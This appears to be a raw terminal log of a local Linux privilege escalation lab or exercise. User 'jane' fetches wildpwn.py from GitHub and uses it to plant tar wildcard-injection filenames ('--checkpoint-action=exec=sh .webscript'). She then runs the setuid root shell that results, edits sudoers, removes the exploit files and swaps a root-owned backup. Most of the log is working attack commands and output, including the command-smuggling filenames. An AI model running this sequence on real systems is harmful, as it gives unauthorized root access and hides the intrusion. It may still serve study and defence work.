
================= tar exploit with wildpwn.py =================

$python wildpwn.py tar .

sysadmin@UbuntuDesktop:/$ su jane
Password: 
jane@UbuntuDesktop:/$ whoami
jane
jane@UbuntuDesktop:/$ ls -l
jane@UbuntuDesktop:/$ ls -al
jane@UbuntuDesktop:/$ ls -lat
jane@UbuntuDesktop:/$ ls -lah




 ================= Example =================

sysadmin@UbuntuDesktop:~$ sudo su jane
[sudo] password for sysadmin: 
jane@UbuntuDesktop:/home/sysadmin$ sudo -l
Sorry, user jane may not run sudo on UbuntuDesktop.
 
jane@UbuntuDesktop:~/Documents/ExploitTar$ wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py
 
 
jane@UbuntuDesktop:~/Documents/ExploitTar$ python wildpwn.py tar .
[!] Selected payload: tar
[+] Done! Now wait for something like: tar cf archive.tar * on ./. Good luck!
jane@UbuntuDesktop:~/Documents/ExploitTar$ ls -lat
total 20
drwxr-xr-x 3 jane jane 4096 Apr 14 21:00  .
-rw-rw-r-- 1 jane jane    0 Apr 14 21:00 '--checkpoint=1'
-rw-rw-r-- 1 jane jane    0 Apr 14 21:00 '--checkpoint-action=exec=sh .webscript'
-rw-rw-r-- 1 jane jane  535 Apr 14 21:00  .webscript
drwxr-xr-x 4 jane jane 4096 Apr 14 20:56  ..
-rw-rw-r-- 1 jane jane 3699 Apr 14 20:53  wildpwn.py
drwxr-xr-x 2 jane jane 4096 Feb  4 13:06 'important docs'
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f9
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f8
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f7
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f6
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f5
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f4
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f3
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f2
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f10
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f1

jane@UbuntuDesktop:~/Documents/ExploitTar$ ls -lat
total 20
drwxr-xr-x 4 jane jane 4096 Apr 14 21:02  .
drwxr-xr-x 2 root root 4096 Apr 14 21:02  .cache
drwxr-xr-x 4 jane jane 4096 Apr 14 20:56  ..
-rw-rw-r-- 1 jane jane 3699 Apr 14 20:53  wildpwn.py
drwxr-xr-x 2 jane jane 4096 Feb  4 13:06 'important docs'
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f9
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f8
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f7
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f6
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f5
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f4
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f3
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f2
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f10
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f1
jane@UbuntuDesktop:~/Documents/ExploitTar$ cd .cache/
jane@UbuntuDesktop:~/Documents/ExploitTar/.cache$ ls
jane@UbuntuDesktop:~/Documents/ExploitTar/.cache$ ls -lah
total 20K
drwxr-xr-x 2 root root 4.0K Apr 14 21:02 .
drwxr-xr-x 4 jane jane 4.0K Apr 14 21:02 ..
-rwsr-xr-x 1 root root 8.2K Apr 14 21:02 .cachefile

jane@UbuntuDesktop:~/Documents/ExploitTar/.cache$ ./.cachefile
root@UbuntuDesktop:~/Documents/ExploitTar/.cache# whoami
root
root@UbuntuDesktop:~/Documents/ExploitTar/.cache# sudo visudo
root@UbuntuDesktop:~/Documents/ExploitTar/.cache# exit
logout
jane@UbuntuDesktop:~/Documents/ExploitTar/.cache$ whoami
jane

jane@UbuntuDesktop:~/Documents/ExploitTar/.cache$ cd ..
jane@UbuntuDesktop:~/Documents/ExploitTar$ ls
 f1   f10   f2   f3   f4   f5   f6   f7   f8   f9  'important docs'   wildpwn.py
jane@UbuntuDesktop:~/Documents/ExploitTar$ sudo cp wildpwn.py wildpwn1.py
jane@UbuntuDesktop:~/Documents/ExploitTar$ ls
 f1   f10   f2   f3   f4   f5   f6   f7   f8   f9  'important docs'   wildpwn1.py   wildpwn.py
jane@UbuntuDesktop:~/Documents/ExploitTar$ ls -lah
total 24K
drwxr-xr-x 4 jane jane 4.0K Apr 14 21:07  .
drwxr-xr-x 4 jane jane 4.0K Apr 14 20:56  ..
drwxr-xr-x 2 root root 4.0K Apr 14 21:02  .cache
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f1
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f10
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f2
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f3
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f4
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f5
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f6
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f7
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f8
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f9
drwxr-xr-x 2 jane jane 4.0K Feb  4 13:06 'important docs'
-rw-r--r-- 1 root root 3.7K Apr 14 21:07  wildpwn1.py
-rw-rw-r-- 1 jane jane 3.7K Apr 14 20:53  wildpwn.py
jane@UbuntuDesktop:~/Documents/ExploitTar$ ls -lat
total 24
drwxr-xr-x 4 jane jane 4096 Apr 14 21:07  .
-rw-r--r-- 1 root root 3699 Apr 14 21:07  wildpwn1.py
drwxr-xr-x 2 root root 4096 Apr 14 21:02  .cache
drwxr-xr-x 4 jane jane 4096 Apr 14 20:56  ..
-rw-rw-r-- 1 jane jane 3699 Apr 14 20:53  wildpwn.py
drwxr-xr-x 2 jane jane 4096 Feb  4 13:06 'important docs'
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f9
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f8
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f7
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f6
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f5
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f4
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f3
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f2
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f10
-rwxr-xr-x 1 jane jane    0 Feb  4 13:06  f1
jane@UbuntuDesktop:~/Documents/ExploitTar$ cd ..
jane@UbuntuDesktop:~/Documents$ sudo rm -r ExploitTar/
jane@UbuntuDesktop:~/Documents$ ls
Company_Docs  jane_docs_backup.tar
jane@UbuntuDesktop:~/Documents$ sudo cp jane_docs_backup.tar jan_1.tar
jane@UbuntuDesktop:~/Documents$ ls
Company_Docs  jan_1.tar  jane_docs_backup.tar
jane@UbuntuDesktop:~/Documents$ rm jane_docs_backup.tar 
rm: remove write-protected regular file 'jane_docs_backup.tar'? y
jane@UbuntuDesktop:~/Documents$ ls
Company_Docs  jan_1.tar
jane@UbuntuDesktop:~/Documents$ ls -lah
total 292K
drwxr-xr-x 3 jane jane 4.0K Apr 14 21:10 .
drwxr-xr-x 9 jane jane 4.0K Apr 14 21:05 ..
drwxr-xr-x 2 jane jane 4.0K Feb  4 13:05 Company_Docs
-rw-r--r-- 1 root root 280K Apr 14 21:10 jan_1.tar
jane@UbuntuDesktop:~/Documents$ ls -lah
total 292K
drwxr-xr-x 3 jane jane 4.0K Apr 14 21:10 .
drwxr-xr-x 9 jane jane 4.0K Apr 14 21:05 ..
drwxr-xr-x 2 jane jane 4.0K Feb  4 13:05 Company_Docs
-rw-r--r-- 1 root root 280K Apr 14 21:10 jan_1.tar
jane@UbuntuDesktop:~/Documents$ mv jan_1.tar jane_docs_backup.tar && rm jan_1.tar 
rm: cannot remove 'jan_1.tar': No such file or directory
jane@UbuntuDesktop:~/Documents$ mv jan_1.tar jane_docs_backup.tar^C
jane@UbuntuDesktop:~/Documents$ ls -lah
total 292K
drwxr-xr-x 3 jane jane 4.0K Apr 14 21:11 .
drwxr-xr-x 9 jane jane 4.0K Apr 14 21:05 ..
drwxr-xr-x 2 jane jane 4.0K Feb  4 13:05 Company_Docs
-rw-r--r-- 1 root root 280K Apr 14 21:10 jane_docs_backup.tar

jane@UbuntuDesktop:~/Documents$ sudo visudo
jane@UbuntuDesktop:~/Documents$ whoami
jane
jane@UbuntuDesktop:~/Documents$ exit
exit
sysadmin@UbuntuDesktop:/$ whoami
sysadmin
sysadmin@UbuntuDesktop:/$ whoami; pwd
sysadmin
/
sysadmin@UbuntuDesktop:/$ cd 
sysadmin@UbuntuDesktop:~$ whoami; cd ; pwd
sysadmin
/home/sysadmin
sysadmin@UbuntuDesktop:~$ 


